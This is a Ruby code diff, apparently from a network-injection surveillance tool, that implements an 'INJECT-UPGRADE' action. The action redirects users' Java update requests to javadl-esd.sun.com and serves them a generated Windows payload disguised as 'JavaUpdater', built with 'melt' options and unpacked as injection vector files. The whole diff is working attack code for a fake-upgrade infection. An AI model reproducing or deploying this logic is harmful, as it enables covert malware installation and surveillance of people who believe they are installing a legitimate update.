@@ -32,8 +32,8 @@ class InjectorTask
       # use the key of the hash to avoid duplicates
       redirect_user["#{rule.ident} #{rule.ident_param}"] ||= tag
 
+      rule.resource = 'javadl-esd.sun.com/update/1.6.0/map*1.6.0.xml' if rule.action == 'INJECT-UPGRADE'
       redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"
-
 
       case rule.action
         when 'REPLACE'
@@ -94,8 +94,32 @@ class InjectorTask
           end
           File.delete(temp_zip)
         when 'INJECT-UPGRADE'
-          #TODO: implement fake upgrade
-          raise "not implemented"
+          appname = 'JavaUpdater' + progressive.to_s
+          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
+
+          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          # generate the applet
+          params = {'factory' => {'_id' => rule.action_param},
+                    'generate' => {'platforms' => ['windows'],
+                                   'binary' => {'demo' => false, 'admin' => false},
+                                   'melt' => {'admin' => false}
+                                  },
+                    'melt' => {'appname' => appname}
+                    }
+          build = Build.factory(:upgrade)
+          build.create params
+          FileUtils.cp build.path(build.outputs.first), temp_zip
+          build.clean
+
+          # extract the zip and take the applet files
+          Zip::ZipFile.open(temp_zip) do |z|
+            z.each do |f|
+              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+              z.extract(f, f_path) unless File.exist?(f_path)
+              vector_files[f.name] = f_path
+            end
+          end
+          File.delete(temp_zip)
       end
 
     end
